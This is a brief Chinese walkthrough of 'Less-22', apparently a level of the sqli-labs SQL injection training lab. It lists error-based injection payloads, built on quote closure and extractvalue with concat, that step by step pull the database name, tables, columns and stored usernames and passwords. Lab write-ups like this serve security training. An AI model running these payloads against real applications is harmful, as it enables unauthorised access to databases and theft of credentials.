---
title: Less - 22
date: 2023-03-15T14:00:31Z
lastmod: 2023-03-15T14:12:28Z
---

# Less - 22

---

# 通关教程

---

## 1、判断闭合

---

尝试如下闭合

```html
admin"
```

​![image](assets/image-20230315140527-g9565ow.png)​

```html
admin"#
```

​![image](assets/image-20230315140616-4crlhpr.png)​

---

## 2、查看数据库名

---

```html
1" and extractvalue(1,concat(0x7e,database(),0x7e));#
```

​![image](assets/image-20230315140745-9jr99jl.png)​

---

## 3、查看数据表名

---

```html
1" and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e));#
```

​![image](assets/image-20230315140937-2irsd8f.png)​

---

## 4、查看字段名

---

```html
1" and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e));#
```

​![image](assets/image-20230315141131-1asx4qn.png)​

---

## 5、查看字段值

---

```html
1" and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users),0x7e));#
```

​![image](assets/image-20230315141219-t40sit9.png)​

‍
